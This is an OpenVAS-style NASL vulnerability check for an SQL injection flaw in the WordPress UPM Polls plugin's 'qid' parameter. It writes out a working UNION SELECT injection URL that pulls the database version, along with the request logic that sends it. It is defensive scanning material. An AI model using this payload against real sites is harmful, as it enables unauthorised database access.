CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802032" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress UPM Polls Plugin 'qid' Parameter SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45535" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17627" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103755" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow an attacker to cause an SQL injection attack
  and gain sensitive information." );
	script_tag( name: "affected", value: "WordPress UPM Polls Plugin version 1.0.3 and prior." );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input passed via
  the 'qid' parameter to '/wp-content/plugins/upm-polls/includes/poll_logs.php'
  allows attacker to manipulate SQL queries by injecting arbitrary SQL code." );
	script_tag( name: "solution", value: "Update to UPM Polls WordPress plugin version 1.0.4 or later" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is running WordPress UPM Polls Plugin and is prone to an
  SQL injection vulnerability." );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/upm-polls/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
vtstrings = get_vt_strings();
path = dir + "/wp-content/plugins/upm-polls/includes/poll_logs.php?qid=" + "-1%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x" + vtstrings["lowercase_hex"] + ",0x3a,@@version,0x3a,0x" + vtstrings["lowercase_hex"] + "),NULL,NULL,NULL,NULL--%20";
req = NASLString( "GET ", path, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Referer: http://", host, path, "\\r\\n", "\\r\\n" );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(eregmatch( pattern: vtstrings["lowercase"] + ":[0-9]+.*:" + vtstrings["lowercase"], string: res )){
	report = http_report_vuln_url( port: port, url: path );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

